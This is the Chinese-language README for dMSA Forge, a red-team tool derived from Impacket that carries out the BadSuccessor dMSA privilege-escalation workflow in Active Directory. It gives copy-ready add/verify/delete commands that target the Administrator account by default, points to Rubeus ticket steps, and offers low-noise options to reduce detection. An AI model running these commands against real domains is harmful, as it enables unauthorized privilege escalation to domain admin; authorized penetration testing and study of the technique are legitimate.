# dMSA Forge

[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.6)
[![Tests](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml/badge.svg)](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml)
[![License](https://img.shields.io/badge/license-Impacket%20Apache--1.1-blue)](https://github.com/RedteamNotes/dmsa-forge/blob/main/LICENSE)

**语言：** [English](../README.md) | 简体中文 | [Français](README.fr.md)

当前版本：`v0.5.6`

面向授权 [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) LDAP 工作流的 [dMSA](https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) forge：add、verify、delete、search。

围绕 LDAP 389 签名连接、原子化 dMSA 创建、创建后验证、简洁操作帮助、项目 profile 和结构化报告设计。

<p align="center">
  <img src="dMSAForge.png" alt="dMSA Forge by RedteamNotes" width="100%">
</p>

本项目基于 Impacket `examples/badsuccessor.py`，并保留上游归属和许可上下文。此版本由 **RedteamNotes** 大幅重构，使 LDAP 389 签名连接、原子化 dMSA 创建以及创建后的读取验证更加明确且可复现。

仅可在你拥有明确授权的环境中使用。

## 主要变化

- 直接使用 Impacket 原生 `LDAPConnection`；`ldap3` 不再是运行时依赖。
- 支持 389 端口上的签名 LDAP，适用于强制 LDAP signing 且 LDAPS 不可用的环境。
- 在初始 AddRequest 中写入 dMSA 核心属性，包括 `msDS-GroupMSAMembership`、`msDS-ManagedAccountPrecededByLink` 和 `msDS-DelegatedMSAState`。
- 添加后会从 DC 读取对象并验证状态。
- 将 `msDS-GroupMSAMembership` 解析为二进制安全描述符，并输出可读摘要，而不是原始字节。
- 添加只读的 `verify` 动作。
- 现代化操作体验：命令入口直接对应实际任务、简洁上下文帮助、自动推断默认值、后续命令建议和结构化报告。
- 增强执行前检查和报告流程：dry-run 计划、scope guardrail、默认脱敏结构化输出、readiness 检查和更清晰的失败诊断。
- 保持输出语义准确：LDAP 验证成功并不代表 KDC 已就绪。

## 安装

通过 GitHub 使用 `pipx` 安装：

```bash
pipx install git+https://github.com/RedteamNotes/dmsa-forge.git
```

或者克隆仓库并从本地检出目录安装：

```bash
git clone https://github.com/RedteamNotes/dmsa-forge.git
python -m venv dmsa-forge/.venv
source dmsa-forge/.venv/bin/activate
python -m pip install ./dmsa-forge
```

安装后运行：

```bash
dmsa-forge -h
```

同时会安装等价入口 `dmsaforge`。如果当前 shell 位于包含 `dmsa-forge/` 源码目录的位置，且裸 `dmsa-forge` 被 shell 目录跳转拦截，可改用 `dmsaforge`。

有新版本时，直接更新当前正在使用的环境：

```bash
dmsa-forge update
```

`update` 会先比较当前安装版本和目标发布版本。版本相同就跳过 pip；只要版本不同就更新，不比较高低。只有明确想跳过版本检查时才使用 `dmsa-forge update --force`。

常用帮助入口：

```bash
dmsa-forge add -h
dmsa-forge add --help-advanced
dmsa-forge update --dry-run
```

如果不安装、只在源码检出目录中使用，可运行 `./dmsa-forge.py`。
下面的示例使用直接对应任务的命令和现代 `--long-option` 参数。

## 快速开始

使用 safe profile 预览 add。README 中的命令刻意采用一行可复制形式；如果需要使用 `proxychains -f chain1080.conf -q` 这类本地 wrapper，把它放在 `dmsa-forge` 前面即可。

```bash
dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --profile safe --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --principals-allowed '<SID_OR_NAME>'
```

默认情况下，`DOMAIN/user` 会推断 `--scope-domain`、`--scope-base-dn` 和 `--base-dn`；连接默认使用 LDAP/389；`--target-account` 默认是 `Administrator`；设置 `--dmsa-name` 后，`--dns-hostname` 会按账号域名推断。需要覆盖时再显式传对应参数。

## 操作流程

这些模板保持一行形式，便于复制粘贴、回看 shell history 和整理演练记录。使用前请替换占位符。

添加前验证：

```bash
dmsa-forge verify eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen
```

计划添加：

```bash
dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --principals-allowed '<SID_OR_NAME>'
```

添加：

```bash
dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --principals-allowed '<SID_OR_NAME>'
```

添加后验证：

```bash
dmsa-forge verify eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen
```

用完后删除：

```bash
dmsa-forge delete eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --yes
```

`add` 或 `verify` 验证成功后，`Next steps` 会直接给出具体的外部 Kerberos 命令。生成流程会先执行 `Rubeus hash`，再把输出中的 AES256 值用于 `asktgt`，最后执行 dMSA `asktgs` 请求。

目标账号解析基于 LDAP 搜索。`add` 默认把 `--target-account` 设为 `Administrator`；如果授权流程指向其它账号，再显式传入对应的 sAMAccountName 或 DN。

安全控制：

- 使用 `dmsa-forge plan ACTION ...`、`--dry-run` 或 `--plan` 校验参数并打印计划 LDAP 操作，不会打开 LDAP 连接。
- 使用 `--profile safe` 启用默认脱敏 dry-run 预设，`--profile report` 启用 JSON 报告，`--profile ci` 启用 quiet JSON/no-banner 输出。
- `DOMAIN/user` 会推断 `--scope-domain`、`--scope-base-dn` 和 `--base-dn`；合法的 `--scope-base-dn` 也可以提供默认 base DN。授权范围不同时再显式覆盖。
- 未指定 `--method` 和 `--port` 时，先尝试 LDAP/389。如果连接失败，dMSA Forge 可以继续尝试 LDAPS/636，并把候选尝试写入终端输出和 JSON/文本报告。单独传 `--port 636` 会推断为 LDAPS；同时指定 `--method` 和 `--port` 时才要求完全匹配。
- 设置 `--dmsa-name` 后，`--dns-hostname` 默认推断为 `<dmsa-name>.<account-domain>`。
- 使用 `--dc-host` 指定 DC 主机名；只有 DNS 或路由需要 IP 覆盖时才传 `--dc-ip`。自动 DC IP 解析不会做网络探测；multicast、loopback、link-local、unspecified、broadcast 和 reserved 结果会被拒绝，避免 proxy DNS 占位地址（例如 `224.0.0.1`）进入 Kerberos `/dc:` 参数。
- 对 `search` 来说，`--target-ou` 用于缩小 OU 搜索基准。DC 前置检查是 best-effort；失败时会继续 OU 搜索并记录 warning。
- 目标账号名和 `--principals-allowed` 名称解析会优先选择精确的 `sAMAccountName`、UPN 或 CN 匹配。LDAP 结果有歧义时默认失败，并提示传完整 DN 或 SID。
- `delete` 必须显式传入 `--yes`。旧的 `modify` 工作流已移除；请使用 `delete`、`add` 和 `verify`。
- 本地输出默认脱敏。`--no-redact` 必须同时使用 `--debug`。
- 使用 `--json` 输出结构化报告，使用 `--output FILE` 以 `0600` 权限写入报告文件。
- 使用 `--output-only` 进行超静默执行。该选项会自动开启 `--quiet`、`--no-banner`，未带 `--output` 时默认输出 JSON；带 `--output` 时文件仍以 JSON 形式写入。
- 使用 `--quiet` 将终端输出压缩为警告/错误级别。
- 嵌入本地脚本时可用 `--no-banner` 压缩本地输出。
- 使用 `--lean` 开启更轻量的本地输出和搜索默认值（等价于 `--minimal`、`--quiet`、`--skip-dc-prereq`、`--no-banner`）。`--low-noise` 继续作为兼容别名保留。

结构化 JSON 报告包含 `schema_version`，便于自动化脚本固定解析行为。

搜索模式：

- `search` 默认执行 OU 安全描述符分析。
- 搜索结果列出具备 BadSuccessor 相关 OU 权限的主体，也就是能创建 dMSA 对象或控制对应 OU 的主体。工具会把这些 SID 与当前绑定账号的 `objectSid` 和 `tokenGroups` 比对，并标记每行是否适用于当前绑定账号；如果 `tokenGroups` 不可用，组授权命中会显示为 `unknown`。
- 使用 `--summary` 才会进入轻量 OU-only 列表模式。`--include-security-descriptor` 和 `--include-sd` 继续作为默认分析模式的显式兼容别名保留。
- `--resolve-names` 用于把匹配 SID 解析成名称。
- 使用 `--minimal` 避免广泛 search 分析、名称解析和额外 Kerberos 命令输出。
- `--skip-dc-prereq` 可跳过 `search` 中的 DC 操作系统前置检查，降低 LDAP 查询噪声。

高级和兼容性细节见 [advanced.zh-CN.md](advanced.zh-CN.md)。

测试：

```bash
python -m unittest discover -s tests
```

## Kerberos 边界

本工具只验证 LDAP 对象状态。它不会验证 KDC 是否已经就绪，也不会执行 Rubeus。

在后续 Kerberos dMSA 请求中建议显式使用 IPv4，例如 `/dc:<DC_IPV4>`，以避免意外解析到 IPv6 link-local 地址。

工具默认不会在 add 后等待。使用 `--verify-attempts N` 和 `--verify-delay SECONDS` 显式控制 LDAP 验证重试；确实需要延迟时使用 `--kdc-wait SECONDS`。

## 归属

上游基础：

- Impacket `examples/badsuccessor.py`
- 原作者：Ilya Yatsenko (`@fulc2um`)
- Impacket 版权：Fortra, LLC and affiliates

修改：

- RedteamNotes

源代码来源和许可说明见 [NOTICE.md](../NOTICE.md)。

许可证：继承自 Impacket 的 modified Apache Software License 1.1 条款；详见 [LICENSE](../LICENSE)。
